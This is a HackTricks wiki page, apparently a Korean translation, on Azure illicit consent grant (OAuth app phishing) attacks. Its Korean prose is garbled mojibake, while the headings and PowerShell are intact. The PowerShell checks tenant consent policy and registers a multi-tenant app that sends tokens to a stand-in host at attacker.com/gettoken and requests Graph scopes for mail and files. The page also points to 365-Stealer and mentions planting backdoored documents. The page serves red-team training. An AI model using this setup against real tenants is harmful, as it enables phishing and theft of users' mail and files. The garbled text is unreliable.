# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications**ì€ **ì‚¬ìš©ì ë°ì´í„°**(ê¸°ë³¸ ì •ë³´ë¿ë§Œ ì•„ë‹ˆë¼ ë¬¸ì„œ ì ‘ê·¼, ì´ë©”ì¼ ì „ì†¡ ë“±)ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ê¶Œí•œì„ ìš”ì²­í•©ë‹ˆë‹¤.\
**í—ˆìš©**ë˜ë©´, ì¼ë°˜ ì‚¬ìš©ìëŠ” **"Low Impact" ê¶Œí•œ**ì— ëŒ€í•´ì„œë§Œ ë™ì˜ë¥¼ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ë‹¤ë¥¸ ëª¨ë“ ** ê²½ìš°ì—ëŠ” **ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”**í•©ë‹ˆë‹¤.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ë° `permission to grant permissions to applications`ë¥¼ í¬í•¨í•˜ëŠ” ì‚¬ìš©ì ì •ì˜ ì—­í• ì€ í…Œë„ŒíŠ¸ ì „ì²´ì— ëŒ€í•œ ë™ì˜ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”í•˜ì§€ ì•Šì€** ê¶Œí•œë§Œì´ **low impact**ë¡œ ë¶„ë¥˜ë©ë‹ˆë‹¤. ì´ëŠ” **ê¸°ë³¸ ë¡œê·¸ì¸ì— í•„ìš”í•œ ê¶Œí•œì¸ openid, profile, email, User.Read ë° offline\_access**ì…ë‹ˆë‹¤. **ì¡°ì§**ì´ **ëª¨ë“  ì•±ì— ëŒ€í•œ ì‚¬ìš©ì ë™ì˜**ë¥¼ í—ˆìš©í•˜ë©´, ì§ì›ì€ ìì‹ ì˜ í”„ë¡œí•„ì—ì„œ **ìœ„ì˜ ì •ë³´ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ”** ì•±ì— ë™ì˜ë¥¼ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

ë”°ë¼ì„œ, ê³µê²©ìëŠ” **ì•…ì„± ì•±**ì„ ì¤€ë¹„í•˜ê³  **í”¼ì‹±**ì„ í†µí•´ ì‚¬ìš©ìê°€ **ì•±ì„ ìˆ˜ë½í•˜ê³  ë°ì´í„°ë¥¼ íƒˆì·¨**í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2 Types of Illicit Consent Grant Attacks

* **Unauthenticated**: ì™¸ë¶€ ê³„ì •ì—ì„œ `User.Read` ë° `User.ReadBasic.All` ê¶Œí•œì„ ê°€ì§„ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•˜ê³ , ì‚¬ìš©ìë¥¼ í”¼ì‹±í•˜ì—¬ ë””ë ‰í„°ë¦¬ ì •ë³´ë¥¼ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ëŠ” í”¼ì‹±ëœ ì‚¬ìš©ìê°€ ì™¸ë¶€ í™˜ê²½ì—ì„œ OAuth ì•±ì„ ìˆ˜ë½í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤!
* **Authenticated**: ì¶©ë¶„í•œ ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ë¥¼ ì†ìƒì‹œí‚¨ í›„, ê³„ì • ë‚´ì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•˜ê³  ê¶Œí•œ ìˆëŠ” ì‚¬ìš©ìë¥¼ í”¼ì‹±í•˜ì—¬ ê¶Œí•œ ìˆëŠ” OAuth ê¶Œí•œì„ ìˆ˜ë½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ ê²½ìš° ì´ë¯¸ ë””ë ‰í„°ë¦¬ ì •ë³´ë¥¼ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ `User.ReadBasic.All` ê¶Œí•œì€ ë” ì´ìƒ í¥ë¯¸ë¡­ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **ê´€ë¦¬ìê°€ ë¶€ì—¬í•´ì•¼ í•˜ëŠ” ê¶Œí•œ**ì— ê´€ì‹¬ì´ ìˆì„ ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤. ì¼ë°˜ ì‚¬ìš©ìëŠ” OAuth ì•±ì— ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— **í•´ë‹¹ ì‚¬ìš©ìë§Œ í”¼ì‹±**í•´ì•¼ í•©ë‹ˆë‹¤(ë‚˜ì¤‘ì— ì–´ë–¤ ì—­í• /ê¶Œí•œì´ ì´ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”ì§€ ë” ì„¤ëª…í•©ë‹ˆë‹¤).

### Check if users allowed to consent

ë‹¤ìŒ PowerShell ëª…ë ¹ì€ Azure Active Directory (Azure AD)ì—ì„œ ì‚¬ìš©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë™ì˜í•  ìˆ˜ ìˆëŠ”ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **ì‚¬ìš©ì ë™ì˜ ë¹„í™œì„±í™”**: ì´ ì„¤ì •ì€ ì‚¬ìš©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ê²ƒì„ ê¸ˆì§€í•©ë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì‚¬ìš©ì ë™ì˜ê°€ í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **ì‚¬ìš©ìê°€ ì„ íƒí•œ ê¶Œí•œì— ëŒ€í•´ ê²€ì¦ëœ ê²Œì‹œì ë˜ëŠ” ì¡°ì§ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë™ì˜í•  ìˆ˜ ìˆìŒ**: ì´ ì„¤ì •ì€ ëª¨ë“  ì‚¬ìš©ìê°€ ê²€ì¦ëœ ê²Œì‹œìê°€ ê²Œì‹œí•œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ìì‹ ì˜ í…Œë„ŒíŠ¸ì— ë“±ë¡ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ë§Œ ë™ì˜í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. íŠ¹ì • ê¶Œí•œì— ëŒ€í•´ì„œë§Œ ë™ì˜ë¥¼ í—ˆìš©í•¨ìœ¼ë¡œì¨ ì œì–´ ê³„ì¸µì„ ì¶”ê°€í•©ë‹ˆë‹¤.
* **ì‚¬ìš©ìê°€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë™ì˜í•  ìˆ˜ ìˆìŒ**: ì´ ì„¤ì •ì€ ë” ê´€ëŒ€í•˜ë©°, ê´€ë¦¬ìì˜ ë™ì˜ê°€ í•„ìš”í•˜ì§€ ì•Šì€ ê¶Œí•œì— ëŒ€í•´ ëª¨ë“  ì‚¬ìš©ìê°€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë™ì˜í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.
* **ë§ì¶¤í˜• ì• í”Œë¦¬ì¼€ì´ì…˜ ë™ì˜ ì •ì±…**: ì´ ì„¤ì •ì€ ë§ì¶¤í˜• ì •ì±…ì´ ì ìš©ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ê²Œì‹œì, ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìš”ì²­í•˜ëŠ” ê¶Œí•œ ë° ê¸°íƒ€ ìš”ì†Œë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ì œí•œ ì¡°í•©ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **Illicit Consent Grant Attack ì´í•´í•˜ê¸°**

Illicit consent grant attackì—ì„œëŠ” ê³µê²©ìê°€ ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ì— ê¶Œí•œì„ ë¶€ì—¬í•˜ë„ë¡ ìµœì¢… ì‚¬ìš©ìë¥¼ ì†ì…ë‹ˆë‹¤. ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í•©ë²•ì ìœ¼ë¡œ ë³´ì´ê²Œ ë§Œë“¤ì–´ í”¼í•´ìê°€ ë¬´ì˜ì‹ì ìœ¼ë¡œ "ìˆ˜ë½" ë²„íŠ¼ì„ í´ë¦­í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤. ê·¸ ê²°ê³¼, Azure ADëŠ” ê³µê²©ìì˜ ì‚¬ì´íŠ¸ì— í† í°ì„ ë°œê¸‰í•˜ì—¬ ì¡°ì§ ê³„ì • ì—†ì´ í”¼í•´ìì˜ ë°ì´í„°(ì˜ˆ: ì´ë©”ì¼ ì½ê¸° ë˜ëŠ” ì „ì†¡, íŒŒì¼ ì•¡ì„¸ìŠ¤)ë¥¼ ì ‘ê·¼í•˜ê³  ì¡°ì‘í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

## **ê³µê²© íë¦„ ê°œìš”**

ê³µê²©ì€ ì¼ë°˜ì ì¸ íšŒì‚¬ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì—¬ëŸ¬ ë‹¨ê³„ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ê·¸ ê³¼ì •ì…ë‹ˆë‹¤:

1. **ë„ë©”ì¸ ë“±ë¡ ë° ì• í”Œë¦¬ì¼€ì´ì…˜ í˜¸ìŠ¤íŒ…**: ê³µê²©ìëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì‚¬ì´íŠ¸ì™€ ìœ ì‚¬í•œ ë„ë©”ì¸ì„ ë“±ë¡í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, "safedomainlogin.com"ì„ ë“±ë¡í•˜ê³ , ì´ ë„ë©”ì¸ ì•„ë˜ì— ì„œë¸Œë„ë©”ì¸(e.g., "companyname.safedomainlogin.com")ì„ ìƒì„±í•˜ì—¬ ê¶Œí•œ ì½”ë“œë¥¼ ìº¡ì²˜í•˜ê³  ì•¡ì„¸ìŠ¤ í† í°ì„ ìš”ì²­í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í˜¸ìŠ¤íŒ…í•©ë‹ˆë‹¤.
2. **Azure ADì— ì• í”Œë¦¬ì¼€ì´ì…˜ ë“±ë¡**: ê³µê²©ìëŠ” ìì‹ ì˜ Azure AD í…Œë„ŒíŠ¸ì— Multi-Tenant Applicationì„ ë“±ë¡í•˜ê³ , íƒ€ê²Ÿ íšŒì‚¬ ì´ë¦„ìœ¼ë¡œ ëª…ëª…í•˜ì—¬ í•©ë²•ì ìœ¼ë¡œ ë³´ì´ê²Œ í•©ë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Redirect URLì„ ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì„œë¸Œë„ë©”ì¸ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.
3. **ê¶Œí•œ ì„¤ì •**: ê³µê²©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë‹¤ì–‘í•œ API ê¶Œí•œ(e.g., `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)ì„ ì„¤ì •í•©ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ê¶Œí•œì„ ë¶€ì—¬í•˜ë©´ ê³µê²©ìëŠ” ì‚¬ìš©ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
4. **ì•…ì„± ë§í¬ ë°°í¬**: ê³µê²©ìëŠ” ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ í´ë¼ì´ì–¸íŠ¸ IDë¥¼ í¬í•¨í•œ ë§í¬ë¥¼ ì‘ì„±í•˜ì—¬ íƒ€ê²Ÿ ì‚¬ìš©ìì—ê²Œ ê³µìœ í•˜ê³ , ì‚¬ìš©ìê°€ ë™ì˜ë¥¼ í•˜ë„ë¡ ì†ì…ë‹ˆë‹¤.

## **ê³µê²©ì— ë„êµ¬ í™œìš©**

ê³µê²©ì€ [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´‰ì§„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‚¬ì „ ê³µê²© ì¤€ë¹„:

ê³µê²©ìê°€ í”¼í•´ ì¡°ì§ì˜ ì‚¬ìš©ìì— ëŒ€í•œ ì–´ëŠ ì •ë„ì˜ ì ‘ê·¼ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ì¡°ì§ì˜ ì •ì±…ì´ ì‚¬ìš©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìˆ˜ë½í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
ê³µê²©ì„ ì‹¤í–‰í•˜ë ¤ë©´, ê³µê²©ìëŠ” **Azure Tenantì— ìƒˆë¡œìš´ Appì„ ìƒì„±**í•´ì•¼ í•©ë‹ˆë‹¤ (App registrationsì—ì„œ), ë‹¤ìŒ ê¶Œí•œìœ¼ë¡œ êµ¬ì„±ëœ:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`ì€ `Microsoft Graph`ì˜ `Delegated permissions`ì— ìˆìŠµë‹ˆë‹¤. (Application permissionsëŠ” í•­ìƒ ì¶”ê°€ ìŠ¹ì¸ì´ í•„ìš”í•©ë‹ˆë‹¤).

* `User.ReadBasic.All`ì€ ë¶€ì—¬ë˜ë©´ ì¡°ì§ ë‚´ ëª¨ë“  ì‚¬ìš©ìì˜ **ì •ë³´ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ”** ê¶Œí•œì…ë‹ˆë‹¤.
* `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ë° `permission to grant permissions to applications`ë¥¼ í¬í•¨í•˜ëŠ” ì‚¬ìš©ì ì •ì˜ ì—­í• ë§Œì´ í…Œë„ŒíŠ¸ ì „ì²´ ë™ì˜ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ **ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”í•œ Appì„ ìŠ¹ì¸ë°›ê¸° ìœ„í•´** ì´ëŸ¬í•œ ì—­í•  ì¤‘ í•˜ë‚˜ë¥¼ ê°€ì§„ ì‚¬ìš©ìë¥¼ **í”¼ì‹±í•´ì•¼ í•©ë‹ˆë‹¤**.

clië¥¼ í†µí•´ Appì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)ì—ì„œ ì„¤ì • ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”.

{% hint style="warning" %}
ì–»ì€ **access token**ì€ **graph endpoint**ì— ëŒ€í•´ `User.Read` ë° `User.ReadBasic.All` (ìš”ì²­ëœ ê¶Œí•œ) ë²”ìœ„ë¥¼ ê°–ê²Œ ë©ë‹ˆë‹¤. ë‹¤ë¥¸ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ (ì´ ê¶Œí•œë“¤ë§Œìœ¼ë¡œë„ ì¡°ì§ì˜ ëª¨ë“  ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ë° ì¶©ë¶„í•©ë‹ˆë‹¤).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

## Post-Exploitation

ì‚¬ìš©ìì—ê²Œ ì ‘ê·¼í•œ í›„ì—ëŠ” ë¯¼ê°í•œ ë¬¸ì„œë¥¼ í›”ì¹˜ê±°ë‚˜ ë°±ë„ì–´ê°€ ì„¤ì¹˜ëœ ë¬¸ì„œ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram group**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
